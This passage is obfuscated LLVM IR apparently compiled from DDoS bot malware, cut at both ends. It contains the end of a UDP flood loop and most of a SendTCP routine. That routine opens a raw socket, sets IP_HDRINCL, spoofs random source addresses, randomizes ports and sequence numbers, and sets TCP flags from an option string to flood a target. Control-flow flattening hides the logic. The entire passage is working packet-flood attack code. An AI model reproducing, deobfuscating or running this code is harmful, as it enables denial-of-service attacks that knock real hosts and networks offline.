  %132 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.1* %132 to %struct.anon.2*
  %134 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %133, i32 0, i32 3
  store i16 0, i16* %134, align 2
  %135 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %136 = bitcast %struct.udphdr* %135 to i8*
  %137 = getelementptr inbounds i8, i8* %136, i64 8
  %138 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %137, i32 %138)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %139 = bitcast i8* %.reload8 to i16*
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  %142 = load i16, i16* %141, align 2
  %143 = zext i16 %142 to i32
  %144 = call zeroext i16 @csum(i16* %139, i32 %143)
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 7
  store i16 %144, i16* %146, align 2
  %147 = call i64 @time(i64* null) #5
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = add nsw i64 %147, %149
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -1378711753, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 -128569588, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %15, align 4
  %155 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %156 = call i64 @sendto(i32 %154, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %155, i32 16)
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 0
  store i16 %158, i16* %162, align 2
  %163 = load i32, i32* %8, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 1110595151, i32 -394498398
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @rand_cmwc()
  store i32 -842210526, i32* %switchVar
  store i32 %167, i32* %.reg2mem12
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %8, align 4
  %170 = trunc i32 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #10
  %172 = zext i16 %171 to i32
  store i32 -842210526, i32* %switchVar
  store i32 %172, i32* %.reg2mem12
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %174 = trunc i32 %.reload13 to i16
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 1
  store i16 %174, i16* %178, align 2
  %179 = call i32 @rand_cmwc()
  %180 = trunc i32 %179 to i16
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i32 @getRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #10
  %186 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %188 = bitcast i8* %.reload6 to i16*
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  %191 = load i16, i16* %190, align 2
  %192 = zext i16 %191 to i32
  %193 = call zeroext i16 @csum(i16* %188, i32 %192)
  %194 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 7
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %23, align 4
  %197 = load i32, i32* %14, align 4
  %198 = icmp eq i32 %196, %197
  %199 = select i1 %198, i32 601638781, i32 1665105214
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = call i64 @time(i64* null) #5
  %202 = load i32, i32* %22, align 4
  %203 = sext i32 %202 to i64
  %204 = icmp sgt i64 %201, %203
  %205 = select i1 %204, i32 311710769, i32 -517453973
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 -191949610, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 -1378711753, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %23, align 4
  %210 = add i32 %209, 1
  store i32 %210, i32* %23, align 4
  store i32 -1378711753, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %212)
  store i32 -630738924, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %211, %208, %207, %206, %200, %173, %168, %166, %153, %152, %125, %120, %118, %73, %66, %61, %60, %59, %53, %52, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1706322845, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1706322845, label %first
    i32 1872844525, label %31
    i32 -455563093, label %35
    i32 2122832281, label %40
    i32 -2131709037, label %46
    i32 -1148542250, label %47
    i32 -300775677, label %54
    i32 -1730176251, label %55
    i32 -1226477606, label %61
    i32 390642228, label %62
    i32 1045872170, label %66
    i32 -559218317, label %67
    i32 1220072718, label %73
    i32 -218016971, label %121
    i32 -433132435, label %164
    i32 -664915326, label %169
    i32 -1192504462, label %184
    i32 928471419, label %189
    i32 91988352, label %204
    i32 -1554512218, label %207
    i32 -1907018139, label %211
    i32 937347516, label %216
    i32 966269473, label %224
    i32 19301496, label %229
    i32 1394330132, label %237
    i32 1904150290, label %242
    i32 -1846673230, label %250
    i32 1400327595, label %255
    i32 -1261427434, label %263
    i32 -1840104163, label %268
    i32 1314794816, label %276
    i32 -719079282, label %281
    i32 -769928390, label %289
    i32 669439012, label %290
    i32 -382039369, label %291
    i32 1379695084, label %292
    i32 2007892207, label %293
    i32 920153723, label %294
    i32 -1530941801, label %295
    i32 2057932632, label %297
    i32 1036833303, label %298
    i32 -2029462034, label %316
    i32 1669403742, label %318
    i32 -1948519406, label %323
    i32 1603394264, label %349
    i32 1688731027, label %350
    i32 973191482, label %397
    i32 1278538911, label %403
    i32 -496668568, label %404
    i32 703627558, label %405
    i32 2094240417, label %408
    i32 -1335778868, label %410
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1872844525, i32 -455563093
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 2122832281, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 2122832281, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -2131709037, i32 -1148542250
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1335778868, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1730176251, i32 -300775677
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1335778868, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #5
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 -1226477606, i32 390642228
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1335778868, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %14, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 1045872170, i32 -559218317
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 1220072718, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 1220072718, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.152, i32 0, i32 0)) #9
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 -433132435, i32 -218016971
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon* %151 to %struct.anon.0*
  %153 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon* %158 to %struct.anon.0*
  %160 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -8193
  %163 = or i16 %162, 8192
  store i16 %163, i16* %160, align 4
  store i32 -433132435, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %11, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0)) #9
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -1192504462, i32 -664915326
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon* %178 to %struct.anon.0*
  %180 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = and i16 %181, -8193
  %183 = or i16 %182, 8192
  store i16 %183, i16* %180, align 4
  store i32 -1192504462, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8*, i8** %11, align 8
  %186 = call i32 @strcmp(i8* %185, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i32 0, i32 0)) #9
  %187 = icmp ne i32 %186, 0
  %188 = select i1 %187, i32 91988352, i32 928471419
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon* %191 to %struct.anon.0*
  %193 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -513
  %196 = or i16 %195, 512
  store i16 %196, i16* %193, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon* %198 to %struct.anon.0*
  %200 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %201, -4097
  %203 = or i16 %202, 4096
  store i16 %203, i16* %200, align 4
  store i32 1036833303, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %11, align 8
  %206 = call i8* @strtok(i8* %205, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0)) #5
  store i8* %206, i8** %23, align 8
  store i32 -1554512218, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = icmp ne i8* %208, null
  %210 = select i1 %209, i32 -1907018139, i32 2057932632
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %23, align 8
  %213 = call i32 @strcmp(i8* %212, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %214 = icmp ne i32 %213, 0
  %215 = select i1 %214, i32 966269473, i32 937347516
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon* %218 to %struct.anon.0*
  %220 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %219, i32 0, i32 4
  %221 = load i16, i16* %220, align 4
  %222 = and i16 %221, -513
  %223 = or i16 %222, 512
  store i16 %223, i16* %220, align 4
  store i32 -1530941801, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8*, i8** %23, align 8
  %226 = call i32 @strcmp(i8* %225, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.157, i32 0, i32 0)) #9
  %227 = icmp ne i32 %226, 0
  %228 = select i1 %227, i32 1394330132, i32 19301496
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon* %231 to %struct.anon.0*
  %233 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %232, i32 0, i32 4
  %234 = load i16, i16* %233, align 4
  %235 = and i16 %234, -1025
  %236 = or i16 %235, 1024
  store i16 %236, i16* %233, align 4
  store i32 920153723, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i8*, i8** %23, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.158, i32 0, i32 0)) #9
  %240 = icmp ne i32 %239, 0
  %241 = select i1 %240, i32 -1846673230, i32 1904150290
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon* %244 to %struct.anon.0*
  %246 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %247, -257
  %249 = or i16 %248, 256
  store i16 %249, i16* %246, align 4
  store i32 2007892207, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %23, align 8
  %252 = call i32 @strcmp(i8* %251, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -1261427434, i32 1400327595
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon* %257 to %struct.anon.0*
  %259 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %260, -4097
  %262 = or i16 %261, 4096
  store i16 %262, i16* %259, align 4
  store i32 1379695084, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8*, i8** %23, align 8
  %265 = call i32 @strcmp(i8* %264, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #9
  %266 = icmp ne i32 %265, 0
  %267 = select i1 %266, i32 1314794816, i32 -1840104163
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 0
  %271 = bitcast %union.anon* %270 to %struct.anon.0*
  %272 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %271, i32 0, i32 4
  %273 = load i16, i16* %272, align 4
  %274 = and i16 %273, -2049
  %275 = or i16 %274, 2048
  store i16 %275, i16* %272, align 4
  store i32 -382039369, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i8*, i8** %23, align 8
  %278 = call i32 @strcmp(i8* %277, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.161, i32 0, i32 0)) #9
  %279 = icmp ne i32 %278, 0
  %280 = select i1 %279, i32 -769928390, i32 -719079282
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon* %283 to %struct.anon.0*
  %285 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = and i16 %286, -8193
  %288 = or i16 %287, 8192
  store i16 %288, i16* %285, align 4
  store i32 669439012, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  store i32 669439012, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  store i32 -382039369, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  store i32 1379695084, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 2007892207, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 920153723, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 -1530941801, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %296, i8** %23, align 8
  store i32 -1554512218, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 1036833303, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = call i32 @rand_cmwc()
  %300 = trunc i32 %299 to i16
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 5
  store i16 %300, i16* %304, align 2
  %305 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 0
  %307 = bitcast %union.anon* %306 to %struct.anon.0*
  %308 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %307, i32 0, i32 6
  store i16 0, i16* %308, align 4
  %309 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 7
  store i16 0, i16* %312, align 2
  %313 = load i32, i32* %9, align 4
